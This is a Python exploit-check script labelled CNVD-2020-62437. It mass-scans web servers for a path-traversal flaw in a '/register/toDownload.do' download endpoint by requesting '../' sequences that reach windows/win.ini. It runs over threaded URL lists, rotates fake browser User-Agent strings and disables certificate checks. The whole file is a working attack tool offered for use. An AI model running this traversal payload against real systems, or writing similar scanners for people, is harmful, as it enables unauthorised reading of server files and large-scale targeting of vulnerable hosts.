import requests
import re
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

#获取版本信息
def check_vuln(url):
	url = parse.urlparse(url)
	url1 = url.scheme + '://' + url.netloc
	url2 = url.scheme + '://' + url.netloc + '/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini'
	try:
		headers = {'User-Agent': get_ua()}
		res = requests.get(url2,headers=headers,timeout=15,verify=False)
		if "版权所有" in res.text:
			print("\033[31m[-]%s is no vulnerable\033[0m" %url1)
		else:
			print("\033[32m[+]%s is vulnerable\nvuln link:%s\033[0m" %(url1,url2))
	except Exception as e:
		print ("[-]%sTarget is timeout\033[0m" %url1)


#多线程
def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(check_vuln, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':
	show = r'''
 _____  _   _ _   _______        _____  _____  _____  _____         ____  _____   ___  _____  ______
/  __ \| \ | | | | |  _  \      / __  \|  _  |/ __  \|  _  |       / ___|/ __  \ /   ||____ ||___  /
| /  \/|  \| | | | | | | |______`' / /'| |/' |`' / /'| |/' |______/ /___ `' / /'/ /| |    / /   / / 
| |    | . ` | | | | | | |______| / /  |  /| |  / /  |  /| |______| ___ \  / / / /_| |    \ \  / /  
| \__/\| |\  \ \_/ / |/ /       ./ /___\ |_/ /./ /___\ |_/ /      | \_/ |./ /__\___  |.___/ /./ /   
 \____/\_| \_/\___/|___/        \_____/ \___/ \_____/ \___/       \_____/\_____/   |_/\____/ \_/    
	                                                                                                    
                                                                                                      
                              					CNVD-2020-62437 By m2
	'''
	print(show + '\n')
	arg=ArgumentParser(description='CNVD-2020-62437 By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="Target URL; Example:url.txt")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	start=time()
	if url != None and filename == None:
		check_vuln(url)
	elif url == None and filename != None:
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
	end=time()
	print('任务完成，用时%d' %(end-start))